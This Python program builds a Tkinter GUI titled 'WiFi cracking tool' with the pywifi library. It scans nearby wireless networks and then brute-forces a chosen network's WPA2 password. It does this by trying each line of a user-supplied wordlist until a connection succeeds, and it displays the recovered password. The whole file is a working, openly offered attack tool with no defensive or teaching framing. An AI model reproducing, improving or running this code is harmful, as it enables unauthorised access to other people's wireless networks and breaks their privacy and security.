#!/usr/bin/env python

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox


class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]  # 抓取第一个无线网卡
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(1)  # 休眠1秒

        # GUI元素
        self.get_value = StringVar()
        self.get_wifi_value = StringVar()
        self.get_wifimm_value = StringVar()

    def set_init_window(self):
        self.init_window_name.title("WIFI破解工具")
        self.init_window_name.geometry('600x400')

        labelframe = LabelFrame(self.init_window_name, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10, sticky=(W, E, N, S))

        Button(labelframe, text="搜索附近WiFi", command=self.scans_wifi_list).grid(column=0, row=0, sticky=W)
        Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0, sticky=W)
        Label(labelframe, text="目录路径：").grid(column=0, row=1, sticky=W)
        Entry(labelframe, width=20, textvariable=self.get_value).grid(column=1, row=1, sticky=W)
        Button(labelframe, text="添加密码文件目录", command=self.add_mm_file).grid(column=2, row=1, sticky=W)
        Label(labelframe, text="WiFi账号：").grid(column=0, row=2, sticky=W)
        Entry(labelframe, width=20, textvariable=self.get_wifi_value).grid(column=1, row=2, sticky=W)
        Label(labelframe, text="WiFi密码：").grid(column=2, row=2, sticky=W)
        Entry(labelframe, width=20, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)

        self.wifi_labelframe = LabelFrame(self.init_window_name, text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=1, columnspan=4, sticky=(W, E, N, S), padx=10, pady=10)

        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=200, anchor="center")
        self.wifi_tree.column("c", width=200, anchor="center")
        self.wifi_tree.column("d", width=50, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="Signal")

        self.wifi_tree.grid(row=0, column=0, sticky=(W, E, N, S))
        self.vbar.grid(row=0, column=1, sticky=(N, S))
        self.wifi_labelframe.grid_columnconfigure(0, weight=1)
        self.wifi_labelframe.grid_rowconfigure(0, weight=1)

        self.wifi_tree.bind("<Double-1>", self.onDBClick)

    def scans_wifi_list(self):
        self.iface.scan()
        time.sleep(1)  # 适当调整等待时间
        scanres = self.iface.scan_results()
        self.show_scans_wifi_list(scanres)

    def show_scans_wifi_list(self, scans_res):
        for i in self.wifi_tree.get_children():
            self.wifi_tree.delete(i)
        for index, wifi_info in enumerate(scans_res):
            try:
                ssid = wifi_info.ssid.encode('raw_unicode_escape').decode('utf-8')
            except UnicodeDecodeError:
                ssid = wifi_info.ssid
            self.wifi_tree.insert("", 'end', values=(index + 1, ssid, wifi_info.bssid, wifi_info.signal))

    def add_mm_file(self):
        filename = tkinter.filedialog.askopenfilename()
        if filename:
            self.get_value.set(filename)

    def onDBClick(self, event):
        for item in self.wifi_tree.selection():
            item_text = self.wifi_tree.item(item, "values")
            self.get_wifi_value.set(item_text[1])  # 填充选中的WiFi账号
            self.readPassWord()  # 尝试破解密码

    def readPassWord(self):
        filePath = self.get_value.get()
        wifi_ssid = self.get_wifi_value.get()
        if not filePath or not wifi_ssid:
            tkinter.messagebox.showinfo('提示', '请先选择密码文件和WiFi！')
            return
        with open(filePath, "r", errors="ignore") as pwd_file:
            for pwd in pwd_file:
                if self.connect(pwd.strip(), wifi_ssid):
                    self.get_wifimm_value.set(pwd.strip())
                    tkinter.messagebox.showinfo('提示', '破解成功，密码是：' + pwd.strip())
                    return
            tkinter.messagebox.showinfo('提示', '破解失败，尝试所有密码均不匹配！')

    def connect(self, pwd_str, wifi_ssid):
        profile = pywifi.Profile()
        profile.ssid = wifi_ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm = const.AKM_TYPE_WPA2PSK
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd_str
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(3)  # 等待5秒，以便连接稳定
        if self.iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            self.iface.disconnect()
            time.sleep(0.1)
            return False


def gui_start():
    init_window = Tk()
    ZH_WIFI_GUI = MY_GUI(init_window)
    ZH_WIFI_GUI.set_init_window()
    init_window.mainloop()


if __name__ == '__main__':
    gui_start()
